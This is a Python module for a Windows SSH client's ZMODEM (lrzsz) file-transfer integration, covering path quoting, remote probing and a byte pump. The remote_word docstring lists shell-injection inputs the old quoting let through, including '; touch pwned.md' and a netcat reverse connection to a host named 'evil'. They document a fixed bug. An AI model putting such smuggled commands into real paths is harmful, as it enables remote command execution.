"""lrzsz / ZMODEM integration.

The Unix `lrz` and `lsz` tools talk the ZMODEM protocol over a TTY. We want
the same workflow on Windows: the user types ``rz`` or ``sz file`` on the
remote side, and we forward the byte stream between the SSH channel and a
local ``lrz.exe`` / ``lsz.exe`` subprocess.

The local binary can be placed in::

    <project>/bin/lrz.exe
    <project>/bin/lsz.exe

(Or anywhere on PATH -- the resolver below checks both.)

A *ZmodemPump* wraps an open paramiko channel; when it sees the ZMODEM
start sequence coming from the channel, it spawns the right local binary,
pipes bytes between them, and signals the UI when the transfer is done.
"""
from __future__ import annotations

import os
import re
import shlex
import subprocess
import sys
import tempfile
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path

# ---------------------------------------------------------------------------
# 下载落盘目录
# ---------------------------------------------------------------------------


def _writable(path: Path) -> bool:
    """这个目录现在**真的写得进去**吗。

    判据是落一个临时文件进去再删掉，而不是看 ``os.access``：后者在 Windows
    上对 ACL 和只读属性并不可靠。更要紧的是**它不会创建目录**——而 ``rz``
    自己不会建目录，它只往 cwd 里写。
    """
    try:
        with tempfile.NamedTemporaryFile(dir=str(path), prefix=".rz-probe-",
                                         delete=True) as fh:
            fh.write(b"")
        return True
    except Exception:  # noqa: BLE001
        return False


def default_download_candidates() -> list:
    """默认的退路顺序。配置目录必然存在且可写（``_config_dir`` 已经 mkdir 过）。"""
    from .settings import CONFIG_DIR
    return [
        os.getcwd(),
        str(CONFIG_DIR / "downloads"),
        str(Path(tempfile.gettempdir()) / "MavisSSH" / "downloads"),
    ]


def download_dir(candidates=None) -> str | None:
    """本地 ``rz`` 落盘的目录——返回**第一个真的写得进去的**；全都不行返回 ``None``。

    原来直接用 ``os.getcwd()``。macOS 从 ``.app`` 双击启动时 CWD 是 ``/``，
    ``rz`` 往 ``/`` 写必然权限拒绝；失败发生在子进程里，用户看到的是一句
    没法看懂的错。这跟 :func:`logs._writable_dir` 是同一套退路思路，区别是
    这里退到的是**目录本身**，不是 ``logs/`` 子目录。

    注意 ``mkdir(exist_ok=True)`` 对**已存在的**只读目录也会成功，所以
    能不能用完全由 :func:`_writable` 的探针说了算。

    ``candidates`` 是注入点：生产走默认三档，测试传自己的目录列表。

    **返回 ``None`` 表示"三档都写不进去"**，调用方必须自己处理：这条目录是
    下载能不能开始的**前提**，不能拿一条明知不可用的路径去起子进程。
    """
    if candidates is None:
        candidates = default_download_candidates()
    for raw in candidates:
        p = Path(raw)
        try:
            p.mkdir(parents=True, exist_ok=True)
        except Exception:  # noqa: BLE001
            continue
        if _writable(p):
            return str(p)
    # 三档全灭时**一条路径都不返回**。原来兜底 `return os.getcwd()`，可 cwd
    # 正是 `default_download_candidates()` 的第一档、刚刚被 `_writable()` 判为
    # 写不进去 —— 等于把一条**已知不可用**的路径交给调用方，失败于是落在子
    # 进程里，用户看到的是本地 `rz` 的一段不可读报错。返回 None 让调用方能
    # 报一句说人话的"本地下载目录不可用，X、Y、Z 都试过了"，而且能在**起子
    # 进程之前**就停手，不至于先把远端的 `sz` 拉起来再失败。
    return None


# ---------------------------------------------------------------------------
# 进度
# ---------------------------------------------------------------------------
#
# **不要指望从 lrzsz 的人读输出里拿进度。** 实测（仓库自带的 bin/sz.exe 与
# bin/rz.exe，Windows，两端用管道直连）：
#
#   sz 不加 -v : stderr 整个是 '\r\r'，一个字都没有
#   sz 加  -v  : 'Sending: a.txt\rSending: b.txt\r\r\nTransfer complete\n'
#   rz         : stderr 永远是 'rz waiting to receive.'
#
# （不写 "rz -v 会挂死" —— 我第一版探针量到了那个现象，复核时没能重现，
#   配对跑 `rz -y -v` 是 0.2 秒正常退出、文件落地。结论仍然是"不给 rz 加 -v"，
#   但理由是它没有可用的输出，不是它会挂。别把"没复现"写成"实测如此"。）
#
# 那些 `Bytes Sent:%7ld/%7ld BPS:...` / `Bytes received: ...` 格式串确实
# 躺在二进制里，但那是**连着真终端时**的交互输出路径；我们用管道拉起子进程，
# 走不到那条路。所以下面的 :func:`parse_progress` 只是一层兜底（万一某个平台
# 的构建在管道里也照打），真正的进度由 :class:`ZmodemPump` **自己数字节**给出。
#
# 这条路反而更稳：它不依赖 lrzsz 的措辞、语言版本，也不依赖它愿不愿意打印。
_PROGRESS_RE = re.compile(
    r"Bytes\s+(?:Sent|received):\s*(\d+)"
    r"(?:\s*/\s*(\d+))?"
    r"\s+BPS:\s*(\d+)"
    r"(?:\s+ETA\s+(\d+):(\d+))?",
    re.IGNORECASE,
)

#: sz 每换一个文件就打一行 `Countem: 001 somefile`，用来显示"正在传第几个"。
_COUNTEM_RE = re.compile(r"^Countem:\s*(\d+)\s+(\S.*?)\s*$")

#: 加了 ``-v`` 之后 sz 每个文件开头发一行 `Sending: somefile`。
#: 这是管道场景下**唯一**能拿到的逐文件信号（见 :func:`parse_progress` 的说明）。
_FILENAME_RE = re.compile(r"^(?:Sending|Receiving):\s+(\S.*?)\s*$", re.IGNORECASE)


@dataclass(frozen=True)
class Progress:
    """一行 lrzsz 进度。``total`` 为 0 表示这条没带总量。"""

    transferred: int
    total: int
    bps: int
    eta_secs: int | None = None
    counter: int | None = None
    filename: str | None = None

    @property
    def fraction(self) -> float | None:
        """0..1；总量未知时是 None。"""
        if self.total <= 0:
            return None
        return max(0.0, min(1.0, self.transferred / self.total))


def parse_progress(line: str) -> Progress | None:
    """把一行 lrzsz 的 stderr 输出解析成 :class:`Progress`，不是进度行则 None。"""
    m = _PROGRESS_RE.search(line)
    if m:
        eta = None
        if m.group(4) and m.group(5):
            eta = int(m.group(4)) * 60 + int(m.group(5))
        return Progress(
            transferred=int(m.group(1)),
            total=int(m.group(2) or 0),
            bps=int(m.group(3)),
            eta_secs=eta,
        )
    m = _COUNTEM_RE.match(line.strip())
    if m:
        return Progress(transferred=0, total=0, bps=0,
                        counter=int(m.group(1)), filename=m.group(2))
    return None


# ---------------------------------------------------------------------------
# 路径规划
# ---------------------------------------------------------------------------


def plan_local_upload(paths: list[str]) -> tuple[str, list[str], list[str]]:
    """把本地绝对路径折成 ``(cwd, basenames, skipped)``。

    **必须传 basename 并把 cwd 设成所在目录。** 这不是洁癖：实测（本仓库自带的
    ``bin/sz.exe``，Windows，把 sz 的 stdout 直接接进 rz 的 stdin 跑出来），
    传绝对路径时 **sz 和 rz 的退出码都是 0，却一个字节都没落地**——界面显示
    "传输完成"、远端什么都没有。这是最难查的一类故障，所以封在这个函数里，
    调用方拿到的就一定是能用的形式。

    跨目录的文件没法一次 `sz` 送完：远端只有一次 ``rz`` 在等，而 ``sz`` 传完
    自己那批就退出了，要再送下一批得让远端重新敲一次 ``rz``。所以这里只取
    第一个文件的目录，其余原样退回给调用方报告"已跳过"——和 SFTP 面板跳过
    目录的措辞保持一致。
    """
    if not paths:
        return os.getcwd(), [], []
    first = os.path.dirname(os.path.abspath(paths[0]))
    names: list[str] = []
    skipped: list[str] = []
    seen: set[str] = set()
    for p in paths:
        ap = os.path.abspath(p)
        if os.path.dirname(ap) != first:
            skipped.append(p)
            continue
        name = os.path.basename(ap)
        if name in seen:
            continue
        seen.add(name)
        names.append(name)
    return first, names, skipped


def split_remote_paths(text: str) -> list[str]:
    """把输入框里的一行拆成若干个远程路径。

    按 shell 的规矩拆：空白分隔，单引号/双引号可以包住带空格的路径。这样
    ``sz a.log "my file.txt" /var/log/x`` 能原样落到远端命令行上，而不需要
    用户自己在输入框里补引号。
    """
    out: list[str] = []
    cur: list[str] = []
    quote: str | None = None
    for ch in text:
        if quote:
            if ch == quote:
                quote = None
            else:
                cur.append(ch)
            continue
        if ch in ("'", '"'):
            quote = ch
            continue
        if ch.isspace():
            if cur:
                out.append("".join(cur))
                cur = []
            continue
        cur.append(ch)
    if cur:
        out.append("".join(cur))
    return out


def remote_word(path: str) -> str:
    """一个路径 → **一个**远端 shell word。

    规则只有一条：**这个字符串整体是安全的 word**，里面除了 ``~`` 之外
    没有任何 shell 语法。

    - ``~`` 单独 → ``"${HOME}"``
    - ``~/rest`` → ``"${HOME}"/`` + ``shlex.quote(rest)``
    - 其余 → :func:`shlex.quote`

    **为什么用 ``${HOME}`` 而不是把 ``~`` 原样留在命令行里。**
    原来的写法是「``~`` 开头就原样拼，其余 :func:`shlex.quote`」——
    那是**按值分支**决定要不要转义，缺口就长在分支另一边：``~`` 路径里的
    元字符会被远端 bash **二次解释**。

    实测（``tests/_probe_shelljoin*.py``）：

    ==========================  ==========================  ==============
    输入                       旧实现交给远端的 argv       后果
    ==========================  ==========================  ==============
    ``~/a; touch pwned.md``    ``['~/a;touch', 'pwned.md']`` 多执行一条命令
    ``~/a > /tmp/x``           ``['~/a', '>', '/tmp/x']``    远端写文件
    ``~/a | nc evil 1 4444``   5 个额外 token               远端反向连外网
    ``~/my docs/t.md``         ``['~/my', 'docs/t.md']``     拆成两个参数
    ``/tmp/a;touch pwned.md``  单个字面量                    ✅ 正确转义
    ==========================  ==========================  ==============

    同一批输入**只因 ``~`` 前缀就不转义** —— 这说明是规则缺口，不是设计意图。
    本函数把 ``~`` 换成远端的变量插值，路径里就再没有可被解释的语法了。

    **明确不要用 ``eval echo "$p"``。** 双引号里 ``~`` 不展开（达不到目的），
    而 ``eval`` 会二次解析 —— ``$(...)``、反引号在里面照常执行，
    等于把注入原样装回去。
    """
    if path == "~":
        return '"${HOME}"'
    if path.startswith("~/"):
        # `"${HOME}"/` 与后面的引号段拼起来**仍然是一个 word**：
        # 变量展开后不再分词、不做 glob。
        return '"${HOME}"/' + shlex.quote(path[2:])
    return shlex.quote(path)


def remote_words(paths: list[str]) -> str:
    """把路径列表拼成一段远端命令行，**每个路径恰好一个 word**。

    两个调用点共用这一个函数，所以注入面一次收口：

    - :func:`check_remote_paths`（``conn.exec``）
    - ``main_window.py`` 里把 ``sz`` 命令打进交互式登录 shell
    """
    return " ".join(remote_word(p) for p in paths)


def shell_join(paths: list[str]) -> str:
    """**已废弃**，保留只为让老代码不炸。用 :func:`remote_words`。

    老实现是「``~`` 开头原样拼、其余 :func:`shlex.quote`」——按前缀分支决定
    要不要转义，导致 ``~`` 路径里的元字符被远端 bash 二次解释。
    新实现统一走 :func:`remote_words`，``~`` 用远端 ``${HOME}`` 插值。
    """
    return remote_words(paths)


#: 存在性探测的输出标记。和 `_PROBE_SCRIPT` 一个套路：前缀好过滤、结尾一个
#: ``done`` 用来区分「问出了结果」和「输出被截断」。
_PATH_MARK = "MAVISP"


def check_remote_paths(conn, paths: list[str], timeout: float = 6.0
                       ) -> dict[str, bool] | None:
    """问远端这些路径存不存在，返回 ``{路径: 存不存在}``。

    **探测本身失败（超时、通道半死、远端 shell 不认这个语法）返回 ``None``**，
    调用方必须据此**放行** —— 理由同 :func:`probe_remote`：把一次问不出来的
    结果说成「文件不存在」，会白拦一次本来好好的下载，而用户看到的提示是
    「路径不存在，请检查」，他只会去改路径，不会重试。

    输出被截断（没看到 ``done``）也按失败处理：这时只有部分路径有结果，
    拿它当权威结论就会误判。
    """
    if not paths:
        return {}
    # **让远端回序号，不是回路径。** 回路径看着自然，实则必错：远端 shell
    # 会先做 `~` 展开，用户写 `~/docs/t.md`、远端回的是 `/home/u/docs/t.md`，
    # 两边对不上键 —— 而调用方只能把「对不上」当成不存在，于是**每一个
    # `~` 路径都会被误报成「远程文件不存在」**，这条路径就此完全不可用。
    # 序号没有这个问题：`for p in a b c` 的遍历顺序是确定的，`~` 展开成什么
    # 都不影响第几个是谁。
    #
    # **用 remote_words 而不是 shell_join**：每个路径在远端必须恰好是一个
    # word，且路径数据本身不能带任何可被远端 shell 解释的语法。
    # `~` 由远端的 `${HOME}` 插值完成展开（见 :func:`remote_word`）。
    script = ("i=0; for p in %s; do "
              "if [ -e \"$p\" ]; then echo \"%s 1 $i\"; "
              "else echo \"%s 0 $i\"; fi; i=$((i+1)); done; echo %s done"
              % (remote_words(paths), _PATH_MARK, _PATH_MARK, _PATH_MARK))
    try:
        out, _err = conn.exec(script, timeout=timeout)
    except Exception:                      # noqa: BLE001 — 探测不该炸
        return None

    got: dict[str, bool] = {}
    finished = False
    for raw in (out or "").splitlines():
        line = raw.strip()
        if line == "%s done" % _PATH_MARK:
            finished = True
            break
        if not line.startswith(_PATH_MARK + " "):
            continue
        flag, _, idx = line[len(_PATH_MARK) + 1:].partition(" ")
        if flag not in ("0", "1"):
            continue
        try:
            i = int(idx)
        except ValueError:
            continue
        if 0 <= i < len(paths):
            got[paths[i]] = flag == "1"
    return got if finished else None


# ---------------------------------------------------------------------------
# Binary resolution

BIN_DIR_CANDIDATES: list[Path] = []

def _add_default_bin() -> None:
    # The bundled rz/sz live at <repo>/bin, i.e. next to `main.py` -- not next
    # to this package. This used to be `Path(__file__).parent.parent`, which
    # counted hops and therefore broke the moment the module moved down into
    # `sshclient/core/`: it then pointed at `sshclient/bin` and every transfer
    # silently lost its binary. Walk up and look for the real marker instead,
    # so the next move cannot break it the same way.
    here = Path(__file__).resolve().parent
    for _ in range(6):
        if (here / "bin").is_dir() or (here / "main.py").is_file():
            BIN_DIR_CANDIDATES.append(here / "bin")
            return
        if here.parent == here:
            break
        here = here.parent
    # Nothing matched (unusual checkout) -- keep the old best guess so the
    # failure stays a clear "binary not found" rather than a silent empty list.
    BIN_DIR_CANDIDATES.append(Path(__file__).resolve().parent.parent / "bin")


_add_default_bin()


def _candidate_names(tool: str) -> list[str]:
    """Return a list of candidate filenames for the *tool* (rz or sz).

    Windows has two conventions in common use:
      * the GNU names ``lrz.exe`` / ``lsz.exe`` (julp/lrzsz-win32 and similar)
      * the upstream names ``rz.exe`` / ``sz.exe`` (trzsz/lrzsz-win32,
        msys2/cygwin)
    We accept both, and the non-prefixed names first because the bundled
    trzsz build uses them.

    **POSIX 上绝不列 `.exe`。** 仓库自带的 `bin/rz.exe` 是一个 Windows PE
    可执行文件，它在非 Windows 机器上照样躺在 `bin/` 里；如果把 `.exe` 留在
    候选名里，macOS/Linux 就会优先选中它，然后 `subprocess` 报
    Exec format error —— 而不是因为「没装 lrzsz」。那种机器上正确的来源是
    PATH 里的 `lrz` / `lsz`（README 已经写了怎么装）。
    """
    if sys.platform == "win32":
        return [f"{tool}.exe", f"l{tool}.exe", f"{tool}", f"l{tool}"]
    return [f"l{tool}", tool]


def resolve_binary(tool: str) -> str | None:
    """Return the absolute path to the local lrzsz binary, or None."""
    # 1) Project-local bin/ takes priority
    for d in BIN_DIR_CANDIDATES:
        for n in _candidate_names(tool):
            p = d / n
            if p.is_file():
                return str(p)
    # 2) Anything that lives next to the running interpreter
    here = Path(sys.executable).parent
    for n in _candidate_names(tool):
        p = here / n
        if p.is_file():
            return str(p)
    # 3) Search PATH
    for n in _candidate_names(tool):
        for d in os.environ.get("PATH", "").split(os.pathsep):
            if not d:
                continue
            p = Path(d) / n
            if p.is_file():
                return str(p)
    return None


# ---------------------------------------------------------------------------
# 远端有没有装 lrzsz
# ---------------------------------------------------------------------------

@dataclass
class RemoteProbe:
    """远端 ``sz`` / ``rz`` 的探测结果。

    ``ok`` 和 ``sz``/``rz`` 要分开看：**探测失败不等于没装**。远端是台机器，
    探测完全可能因为超时、shell 非 POSIX、连不上而失败，那种情况下当成"没装"
    就会把一台装了 lrzsz 的机器给误判掉。所以：

    - ``ok is False`` → 这次没问出结果，调用方**照旧走 ZMODEM**，别拦着用户
    - ``ok is True`` 且 ``sz``/``rz`` 为假 → 确实没装，这时才提示
    """
    sz: bool = False
    rz: bool = False
    ok: bool = False
    error: str = ""

    @property
    def usable(self) -> bool:
        """能不能做 ZMODEM 传输。探测失败时**当作能用**（见上面的说明）。"""
        if not self.ok:
            return True
        return self.sz and self.rz


# 一次问完，输出带前缀好解析。用 `command -v` 而不是 `which`：后者属于
# whereis，很多精简镜像里没有。
_PROBE_SCRIPT = (
    "for t in sz rz; do "
    "p=$(command -v $t 2>/dev/null) && echo \"MAVISZ $t $p\"; "
    "done; echo MAVISZ done"
)


def probe_remote(conn, timeout: float = 6.0) -> RemoteProbe:
    """问远端有没有 ``sz`` / ``rz``。``conn`` 需要有 ``exec(command, timeout)``。

    故意用**一次** exec 问完，不分两次问：两次往返在慢链路上就是两次等待，
    而这个探测在每次点上传/下载按钮之前都要跑。
    """
    try:
        out, _err = conn.exec(_PROBE_SCRIPT, timeout=timeout)
    except Exception as exc:                      # noqa: BLE001 — 探测不该炸
        # 超时、通道半死、远端 shell 不认这个语法……都归到这里。
        return RemoteProbe(ok=False, error=str(exc))

    sz = rz = False
    finished = False
    for line in (out or "").splitlines():
        line = line.strip()
        if line == "MAVISZ done":
            finished = True
            break
        parts = line.split()
        if len(parts) == 3 and parts[0] == "MAVISZ":
            if parts[1] == "sz":
                sz = True
            elif parts[1] == "rz":
                rz = True
    if not finished:
        # 跑完的标记都没回来：多半是被超时截断了，这时候的"没找到"不作数。
        return RemoteProbe(ok=False, error="探测输出不完整")
    return RemoteProbe(sz=sz, rz=rz, ok=True)


# ---------------------------------------------------------------------------
# ZMODEM detection

# When the remote `rz` is invoked, it prints a ZRQINIT packet immediately.
# In ZMODEM the magic bytes are:
#     <ZDLE><ZHEX><CR><LF>     = start of any ZMODEM hex header
#     "**\x18B0"                = the well-known "rz waiting" trigger
#     "<ZRQINIT>" is the first header type
#
# We just look for "*\x18B0" anywhere in the inbound stream and treat that
# as "rz wants a file from us" -> spawn lrz.
#
# For sz: the remote `sz` outputs "*\x18B0" too, but as soon as the local
# `lsz` starts, it sends a ZRINIT header. We can simply try to spawn lsz
# in upload-mode once we see any ZMODEM hex header coming from the channel.

# A ZMODEM hex header on the wire looks like:
#     ZPAD ZPAD ZDLE ZHEX <type-hex> ...
#   =  '*'  '*' 0x18  'B'   '0' or '1' ...
# The leading ZPAD is optional: some builds emit only one.
_ZMODEM_HEADER = re.compile(rb"\*?\x18B([0-9A-Fa-f])")

ZRQINIT = "0"
ZRINIT = "1"


# ---------------------------------------------------------------------------
# Pump
# ---------------------------------------------------------------------------

#: stop() 里等本地进程自己退出的宽限。够一个守规矩的子进程走了（实测
#: Windows 上 terminate() 同步就死），又短到不会让界面明显卡一下；超时就
#: 直接 kill。之所以要留这个宽限而不是立刻 kill：肯自己退出的进程会把管道
#: 收拾干净，而那次收尾是靠 kill 完成的。
_STOP_GRACE = 0.5


class ZmodemPump:
    """Bridges bytes between a paramiko channel and a local lrzsz binary.

    Lifecycle::

        pump = ZmodemPump(channel, "upload", binary, files, cwd)
        pump.start()
        ...bytes are shuttled...
        # `on_finished` fires when the local binary exits.

    收尾是**回调**（``on_finished``），不是 Qt 信号 —— 这个泵跑在普通 daemon
    线程上，不属于任何线程亲和性。
    """

    def __init__(
        self,
        channel,
        direction: str,
        binary: str,
        files: list[str] | None = None,
        cwd: str | None = None,
        on_log: Callable[[str], None] | None = None,
        on_finished: Callable[[int], None] | None = None,
        on_file: Callable[[int, str], None] | None = None,
        on_progress: Callable[[int, int, int], None] | None = None,
    ):
        """
        :param channel: paramiko.Channel to bridge over.
        :param direction: "upload" (run lrz) or "download" (run lsz).
        :param binary: absolute path to the local lrzsz executable.
        :param files: for upload, the **base names** to transmit. Absolute
            paths here are a silent no-op -- see :func:`plan_local_upload`.
        :param cwd: working directory for the local binary. Must be the
            directory the names in *files* live in.
        :param on_file: ``(index, name)`` when a new file starts.
        :param on_progress: ``(transferred, total, bps)`` per progress line.
            *total* is 0 when lrzsz has not told us the size yet.
        """
        self._channel = channel
        self.direction = direction
        self.binary = binary
        self.files = files or []
        self.cwd = cwd or os.getcwd()
        self._proc: subprocess.Popen | None = None
        self._stop = threading.Event()
        self._on_log = on_log or (lambda s: None)
        self._on_finished = on_finished or (lambda c: None)
        self._on_file = on_file or (lambda i, n: None)
        self._on_progress = on_progress or (lambda d, t, b: None)
        self._threads: list[threading.Thread] = []

        # 逐文件游标。`sz -v` 每换一个文件打一行 `Sending: <名>`；老版本的
        # `Countem: NNN 名` 也认。都没有时退回"按字节总量估"（见 _tick）。
        self._file_index = 0
        self._file_name = ""
        self._file_seen = False
        self._file_done = False
        # 原来这里有个公开的 `cancel_requested = False`，**全仓没有任何人读它**
        # —— 它和私有的 `self._stop`（一个 `threading.Event`）表达的是同一件事，
        # 两份状态迟早对不上，而对不上的那次表现是「明明取消了还在往子进程灌」。
        # 现在只留 `_stop` 一份，`feed()` 直接按它早退。

        # 自己数字节：pump 自己搬的每一个字节都算得出来。总量在上传方向是
        # 知道的（本地文件大小之和），下载方向拿不到，就报 0 让上层显示不定态
        # —— 编一个百分比比"不知道"更糟。
        self._sent = 0
        self._total = 0
        if direction == "upload":
            for name in self.files:
                try:
                    self._total += os.path.getsize(os.path.join(self.cwd, name))
                except OSError:
                    pass
        self._t0 = time.monotonic()
        self._last_emit = 0.0
        self._last_at = time.monotonic()

    # ------------------------------------------------------------------ public
    #: Which local tool plays which role. The remote command and the local tool
    #: are always *opposites*: remote `rz` receives, so we must run `sz` to send.
    LOCAL_TOOL = {"upload": "sz", "download": "rz"}

    def start(self) -> None:
        args = [self.binary]
        if self.direction == "upload":
            # local `sz` is the sender: it takes the files to transmit.
            # -v 是为了拿到 `Sending: <文件名>` —— 不加它管道里一个字节的进度
            # 都吐不出来（见文件开头）。它不影响协议流，receiver 收的还是文件。
            args.append("-y")  # overwrite without asking
            args.append("-v")
            args.extend(self.files)
        else:
            # local `rz` is the receiver: it just writes whatever arrives.
            # **不给 rz 加 -v**：它的人读输出只有 `rz waiting to receive.` 这一句，
            # 对界面没用（逐文件信号只有发送端 sz 会打）。
            args.append("-y")
        # 最后一道闸：basename 之外的东西一律不往下传。`plan_local_upload`
        # 已经保证了这一点，这里再挡一次是因为传错路径的代价是**静默的**——
        # 进程退出码 0、界面显示"传输完成"、实际零字节落地。
        if self.direction == "upload":
            bad = [f for f in self.files
                   if os.path.basename(f) != f or os.path.isabs(f)]
            if bad:
                self._log(f"拒绝启动：这些不是纯文件名 -> {bad}")
                self._on_finished(2)
                return
        self._log(f"spawn: {' '.join(args)}  (cwd={self.cwd})")

        # On Windows, CREATE_NO_WINDOW so we don't pop a console.
        creationflags = 0
        if sys.platform == "win32":
            creationflags = 0x08000000  # CREATE_NO_WINDOW

        self._proc = subprocess.Popen(
            args,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=self.cwd,
            creationflags=creationflags,
        )

        # The channel is read by the owning widget's QSocketNotifier, which
        # forwards into feed() below. Starting a second reader here would race
        # the notifier for the same bytes: whoever won would starve the other
        # and the loser would see b"" and report a disconnect.
        t2 = threading.Thread(target=self._pump_proc_to_channel, daemon=True)
        t2.start()
        # Stderr logger
        t3 = threading.Thread(target=self._pump_stderr, daemon=True)
        t3.start()
        # Waiter
        t4 = threading.Thread(target=self._wait_proc, daemon=True)
        t4.start()
        self._threads.extend([t2, t3, t4])

    def feed(self, data: bytes) -> None:
        """Hand bytes read from the channel to the local lrzsz process."""
        # **已经 stop 之后就不再往里灌了。** `stop()` 关掉了三根管道，而通道那边
        # 的 notifier 还会再喂几拍才停 —— 于是每一次 `write` 都撞上已关闭的
        # stdin，逐条记一行 `channel->proc write failed`，把日志刷满。
        # 这里早退不是「优化」，是**别在收尾之后还制造噪声**。
        if self._stop.is_set():
            return
        proc = self._proc
        if not proc or not proc.stdin or not data:
            return
        try:
            proc.stdin.write(data)
            proc.stdin.flush()
        except Exception as exc:
            # 写到一半管道被关掉是收尾的正常结果，不是错误 —— 降级成一行日志。
            if not self._stop.is_set():
                self._log(f"channel->proc write failed: {exc}")
            return
        # 下载方向：这些字节就是文件内容，正在往本地 rz 里灌
        if self.direction == "download":
            self._sent += len(data)
            self._tick()

    def _tick(self, force: bool = False) -> None:
        """把当前字节数报给上层，按 120ms 节流。

        4KB 一块、每秒几百次地发信号会把 GUI 事件循环淹掉；而进度条本来也
        看不清比 120ms 更细的变化。
        """
        now = time.monotonic()
        if not force and now - self._last_emit < 0.12:
            return
        self._last_emit = now
        bps = int(self._sent / max(1e-6, now - self._t0))
        sent = self._sent
        if self._total:
            # 协议流里含 ZMODEM 的头和 ACK，所以"字节发够了"会早于"文件真的
            # 传完"。直接钳到 100% 会让条子提前钉在满格然后停滞，看着像卡死；
            # 运行期间封顶 99%，由 succeed() 那一瞬才置满。
            #
            # 99% 这个值**不写死成某个测出来的开销比例**：那个比例依文件大小、
            # 链路、块大小而变（`tests/_zmodem.py` 只断言"已传 < 总量"，不做
            # 具体数值的断言）。这里要的是"别提前满格"这个性质。
            sent = min(sent, int(self._total * 0.99))
        try:
            self._on_file(self._file_index, self._file_name)
            self._on_progress(sent, self._total, bps)
        except Exception as exc:
            # 回调是 UI 侧的，抛了不能带崩搬运线程——但必须留痕。
            self._log(f"进度回调出错：{type(exc).__name__}: {exc}")

    def stop(self) -> None:
        self._stop.set()
        proc = self._proc
        if proc is None:
            return
        if proc.poll() is None:
            try:
                proc.terminate()
            except Exception:
                pass
        # 收尾挪到守护线程上，两条理由都是量出来的：
        #
        # 1) **必须关三根管道。** 只 terminate 不关，忽略 SIGTERM 的构建会留下
        #    一个不退出的本地进程，而 `_wait_proc` 还阻塞在 `proc.wait()` 上 →
        #    `on_finished` 永不触发 → 传输闸门不释放 → **这个会话再也传不了**
        #    （关掉标签重开走的是同一扇闸门）。管道一关，两个搬运线程拿到的是
        #    EOF 而不是继续挂住，所以它们本来就能正常退出。
        # 2) **不能在 stop() 里同步关。** CPython 的 BufferedReader 在 read1()
        #    期间持有缓冲锁，别的线程 close() 得等它 —— 实测「子进程还活着时
        #    close() 两秒没返回，子进程一死就 0.000s 返回」。「子进程还活着」
        #    正是第 1 条要处理的那些构建，同步关等于把「点取消」变成界面卡死。
        threading.Thread(target=self._reap, args=(proc,), daemon=True).start()

    def _reap(self, proc: subprocess.Popen) -> None:
        """确认本地进程真的没了，然后关掉三根管道（见 stop() 的两条理由）。"""
        if proc.poll() is None:
            try:
                proc.wait(timeout=_STOP_GRACE)
            except subprocess.TimeoutExpired:
                # terminate() 没弄死它 —— POSIX 上「忽略 SIGTERM 的构建」就是
                # 这种。Windows 的 terminate() 走 TerminateProcess，忽略不了，
                # 所以这条主要是为 POSIX 准备的。不升级到 kill 就永远等下去，
                # 而管道也就永远关不上。
                try:
                    proc.kill()
                    proc.wait(timeout=_STOP_GRACE)
                except Exception:
                    pass
        for pipe in (proc.stdin, proc.stdout, proc.stderr):
            if pipe is None:
                continue
            try:
                pipe.close()
            except Exception:
                pass

    # ------------------------------------------------------------------ internals
    def _log(self, msg: str) -> None:
        # on_log 由 UI 提供，SessionTab 被析构后 emit 会抛 RuntimeError。
        # 这里必须挡住：log 失败不能带崩搬运线程（那个线程还要搬字节）。
        try:
            self._on_log(f"[zmodem] {msg}")
        except Exception:
            pass

    def _pump_proc_to_channel(self) -> None:
        ch = self._channel
        proc = self._proc
        if not proc or not proc.stdout:
            return
        while not self._stop.is_set():
            try:
                # read1(), never read(): a BufferedReader.read(n) blocks until
                # n bytes arrive or EOF. ZMODEM packets are small, so read()
                # would withhold every byte until the process exited -- by then
                # the remote had long since timed out.
                data = proc.stdout.read1(4096)
            except Exception:
                data = b""
            if not data:
                if proc.poll() is not None:
                    break
                continue
            if ch.closed:
                break
            try:
                ch.sendall(data)
            except Exception as exc:
                self._log(f"proc->channel write failed: {exc}")
                break
            # 上传方向：这些字节就是文件内容
            self._sent += len(data)
            self._tick()

    def _pump_stderr(self) -> None:
        proc = self._proc
        if not proc or not proc.stderr:
            return
        buf = ""
        while not self._stop.is_set():
            try:
                chunk = proc.stderr.read1(4096)
            except Exception:
                break
            if not chunk:
                if proc.poll() is not None:
                    break
                continue
            buf += chunk.decode("utf-8", errors="replace")
            # lrzsz 用 \r 刷新同一行进度，用 \n 换行结束。read1() 给的块既可能
            # 是半行也可能含好几行，所以必须自己攒着按**两种**分隔符切；直接
            # 拿整块去匹配正则是解析不出来的。
            parts = re.split(r"[\r\n]+", buf)
            buf = parts.pop()          # 最后一段可能还没写完，留着
            for line in parts:
                self._handle_line(line)
        if buf.strip():
            self._handle_line(buf)

    def _handle_line(self, line: str) -> None:
        line = line.strip()
        if not line:
            return
        # `Sending: a.txt` / `Receiving: a.txt` —— 管道场景下唯一的逐文件信号
        m = _FILENAME_RE.match(line)
        if m:
            if self._file_seen:
                self._file_index += 1
            self._file_seen = True
            self._file_name = m.group(1)
            self._file_done = False
            self._tick(force=True)
            return
        p = parse_progress(line)
        if p is None:
            self._log(line)
            return
        if p.counter is not None:
            # `Countem: 001 name` —— 老版本的权威来源
            self._file_index = max(0, p.counter - 1)
            self._file_name = p.filename or ""
            self._file_seen = True
            self._file_done = False
        elif self._file_done:
            # 上一个文件已经报满，这条是新文件的第一行
            self._file_index += 1
            self._file_name = ""
            self._file_done = False
        if p.total > 0 and p.transferred >= p.total:
            self._file_done = True
        try:
            self._on_file(self._file_index, self._file_name)
            self._on_progress(p.transferred, p.total, p.bps)
        except Exception as exc:
            self._log(f"进度回调出错：{type(exc).__name__}: {exc}")

    def _wait_proc(self) -> None:
        proc = self._proc
        if not proc:
            return
        code = proc.wait()
        self._log(f"local lrzsz exited with code {code}")
        # 和 _log / _tick 一样要兜住：收尾回调最终会去碰 QObject，而传输途中
        # 关掉标签页的话那个 ZmodemTransfer 已经被 C++ 析构了，于是 emit 抛
        # RuntimeError: wrapped C/C++ object of type ZmodemTransfer has been
        # deleted。不打进程，只是往 stderr 吐一段 traceback，看起来像崩溃。
        try:
            self._on_finished(code)
        except Exception as exc:
            self._log(f"收尾回调出错：{type(exc).__name__}: {exc}")


# ---------------------------------------------------------------------------
# Detector -- a thin shim that watches inbound bytes for a ZMODEM trigger
#
# SSH gives no message-boundary guarantee, so the 4 magic bytes can easily be
# split across two recv() calls. The detector therefore keeps a small tail of
# the previous chunk and re-scans the concatenation.
_TAIL_MAX = 3  # len(b"**\x18B") - 1


